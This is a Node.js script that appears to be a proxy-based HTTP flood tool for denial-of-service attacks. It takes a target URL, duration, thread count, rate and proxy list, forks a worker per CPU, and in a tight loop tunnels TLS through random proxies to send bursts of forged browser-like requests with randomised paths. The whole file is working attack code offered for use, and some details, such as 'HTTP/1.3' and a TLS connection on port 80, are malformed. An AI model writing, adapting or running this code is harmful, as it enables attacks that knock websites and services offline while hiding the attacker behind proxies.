const fs = require('fs');
const url = require('url');
const http = require('http');
const tls = require('tls');
const os = require("os");
const core_cpu = os.cpus().length;

if (process.argv.length < 8) {
    console.log(`usage: ${process.argv[1]} method url time threads req_per_ip proxy cookie`)
    process.exit(1)
}

var VarsDefinetions = {
    MethodRequest: process.argv[2],
    Objective: process.argv[3],
    time: process.argv[4],
    process_count: process.argv[5],
    rate: process.argv[6],
    proxy_file: process.argv[7],
    cookie: process.argv[8] || undefined
}

if (parseInt(VarsDefinetions.process_count) > core_cpu) {
    VarsDefinetions.process_count = core_cpu
}

try {

    var proxies = fs.readFileSync(VarsDefinetions.proxy_file, 'utf-8').toString().replace(/\r/g, '').split('\n');
    var UAs = fs.readFileSync('ua.txt', 'utf-8').replace(/\r/g, '').split('\n');

} catch (err) {

    if (err.code !== 'ENOENT') throw err;
    console.log('proxy or ua file not found');
    process.exit();
}
process.on('uncaughtException', function (e) {
    // console.log(e)
});
process.on('unhandledRejection', function (e) {
    // console.log(e)
});
require('events').EventEmitter.defaultMaxListeners = Infinity;

function getRandomNumberBetween(min, max) {
    return Math.floor(Math.random() * (max - min + 1) + min);
}
function RandomString(length) {
    var result = '';
    var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    var charactersLength = characters.length;
    for (var i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}

function BuildRequest() {

    let path = parsed.path;
    if (path.indexOf("[rand]") !== -1) {
        path = path.replace(/\[rand\]/g, RandomString(getRandomNumberBetween(5, 16)));
    }

    if (VarsDefinetions.cookie === undefined) {
        var socket_prepare = `${VarsDefinetions.MethodRequest} ` +
            path +
            ' HTTP/1.3\r\nHost: ' + parsed.host +
            '\r\nReferer: ' + VarsDefinetions.Objective +
            '\r\nOrigin: ' + VarsDefinetions.Objective +
            '\r\nAccept: */*' +
            '\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.115 Safari/537.36' +
            '\r\nUpgrade-Insecure-Requests: 1\r\n' +
            'Accept-Encoding: *\r\n' +
            'Accept-Language: en-US,en;ru-RU;ru;q=0.9,q=0.8,q=0.7,q=0.6\r\n' +
            'Cache-Control: max-age=0\r\n' +
            'Connection: Keep-Alive\r\n\r\n'
    } else {
        var socket_prepare = `${VarsDefinetions.MethodRequest} ` +
            path +
            ' HTTP/1.3\r\nHost: ' + parsed.host +
            '\r\nReferer: ' + VarsDefinetions.Objective +
            '\r\nOrigin: ' + VarsDefinetions.Objective +
            '\r\nAccept: */*' +
            '\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.115 Safari/537.36' +
            '\r\nUpgrade-Insecure-Requests: 1\r\n' +
            'Accept-Encoding: *\r\n' +
            'Accept-Language: en-US,en;ru-RU;ru;q=0.9,q=0.8,q=0.7,q=0.6\r\n' +
            'Cache-Control: max-age=0\r\n' +
            'Connection: Keep-Alive\r\n' +
            'Cookie: ' + VarsDefinetions.cookie + '\r\n'
    }
    return socket_prepare;
}

const numCPUs = VarsDefinetions.process_count;
var parsed = url.parse(VarsDefinetions.Objective);
process.setMaxListeners(15);

const cluster = require('cluster');

if (cluster.isPrimary) {

    for (let i = 0; i < numCPUs; i++) {
        cluster.fork();
    }

    cluster.on('exit', (worker, code, signal) => {
    });
} else {
    flood()
}


function flood() {
    setInterval(async () => {
        var proxy = proxies[Math.floor(Math.random() * proxies.length)];
        proxy = proxy.split(':');

        var tlsSessionStore = {};

        var req = http.request({
            host: proxy[0],
            port: proxy[1],
            method: 'CONNECT',
            path: parsed.host + ':443'
        }, (err) => {
            req.end();
            return;
        });

        req.on('connect', function (res, socket, head) {//open raw request
            tls.authorized = true;
            tls.sync = true;
            var tlsConnection = tls.connect({
                ciphers: 'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA',
                secureProtocol: 'TLSv1_2_method',
                honorCipherOrder: true,
                host: parsed.host,
                port: 80,
                secureOptions: 'SSL_OP_NO_SSLv1' | 'SSL_OP_NO_SSLv2' | 'SSL_OP_NO_SSLv3' | 'SSL_OP_NO_COMPRESSION',
                servername: parsed.host,
                rejectUnauthorized: false,
                socket: socket
            }, function () {

                for (let j = 0; j < VarsDefinetions.rate; j++) {
                    tlsConnection.setKeepAlive(true, 5000)
                    tlsConnection.setTimeout(5000);
                    var r = BuildRequest();
                    // console.log(r)
                    tlsConnection.write(r);
                }
            });

            tlsConnection.on('newSession', function (id, data) {
                tlsSessionStore[id] = data;
            });
            tlsConnection.on('resumeSession', function (id, cb) {
                cb(null, tlsSessionStore[id] || null);
            });

            var data = '';

            tlsConnection.on('disconnected', () => { tlsConnection.destroy(); });
            tlsConnection.on('timeout', () => { tlsConnection.destroy() });
            tlsConnection.on('error', (err) => { tlsConnection.destroy() });
            tlsConnection.on('data', (chunk) => { data += chunk; tlsConnection.destroy(); chunk.push(chunk); setTimeout(function () { tlsConnection.abort(); return delete tlsConnection; }, 5000); });

            tlsConnection.on('end', () => {
                //console.log(data);
                tlsConnection.abort();
                tlsConnection.destroy();
            });

        }).end()
    }, 0);
}

setTimeout(() => {
    process.exit(1);
}, VarsDefinetions.time * 1000)